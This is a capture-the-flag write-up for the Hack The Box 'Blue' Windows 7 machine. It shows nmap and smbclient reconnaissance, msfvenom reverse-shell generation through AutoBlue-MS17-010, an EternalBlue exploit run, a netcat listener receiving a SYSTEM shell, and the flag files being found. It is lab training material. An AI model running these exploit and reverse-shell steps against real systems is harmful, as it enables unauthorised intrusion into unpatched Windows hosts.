# Blue

Machine Level: Easy 
OS: Windows

## Scanning 
I ran an aggressive NMAP scan to determine OS and versions of some of the services running on host ports. 
```
ajread@aj-ubuntu:~/hackthebox$ nmap -A [TARGET IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-17 20:23 CST
Nmap scan report for [TARGET IP]
Host is up (0.083s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  tcpwrapped
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-18T02:25:03
|_  start_date: 2023-01-18T02:23:11

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.82 seconds
```
It looked like this can be exploited using eternalblue or a similar exploit. 
## Initial Access
I had to look at the service running on port 445 using ```smbclient```. 
```
ajread@aj-ubuntu:~/hackthebox$ smbclient -L [TARGET IP] -U guest
Password for [WORKGROUP\guest]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Share           Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
```
There wasnt anything in any of the fileshares as guest. 

I used the exploit found [here](https://github.com/3ndG4me/AutoBlue-MS17-010) since metasploit was not working for me. After successfully prepping my OS with the required dependencies, I was able to create a payload with ```msfvenom```. 
```
ajread@aj-ubuntu:~/hackthebox/playground/AutoBlue-MS17-010/shellcode$ ./shell_prep.sh 
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
[LOCAL IP]
LPORT you want x64 to listen on:
6666
LPORT you want x86 to listen on:
6666
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
Generating x64 cmd shell (stageless)...

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=[LOCAL IP]LPORT=6666
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Saved as: sc_x64_msf.bin

Generating x86 cmd shell (stageless)...

msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=[LOCAL IP]LPORT=6666
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Saved as: sc_x86_msf.bin

MERGING SHELLCODE WOOOO!!!
DONE
```
I ran the exploit and with a listener on a seperate terminal. 
```
ajread@aj-ubuntu:~/hackthebox/playground/AutoBlue-MS17-010$ python2.7 eternalblue_exploit7.py [TARGET IP] ./shellcode/sc_x64.bin 
shellcode size: 1232
numGroomConn: 13
Target OS: Windows 7 Professional 7601 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
done
```
And I dropped into a shell as administrator. 
```
ajread@aj-ubuntu:~$ nc -lnvp 6666
Listening on 0.0.0.0 6666
Connection received on [TARGET IP] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
There was no privilege escalation necessary and I was able to get both user and admin flags.
```
C:\Users\haris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\haris\Desktop

24/12/2017  02:23    <DIR>          .
24/12/2017  02:23    <DIR>          ..
19/01/2023  21:36                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,170,183,680 bytes free
``` 
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE92-053B

 Directory of C:\Users\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
19/01/2023  21:36                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,170,175,488 bytes free
```
I had a lot of issues running this exploit as metasploit didnt work. I found that AutoBlue was the best route. I had to have the machine reset right before running the exploit to get the cleanest target. 

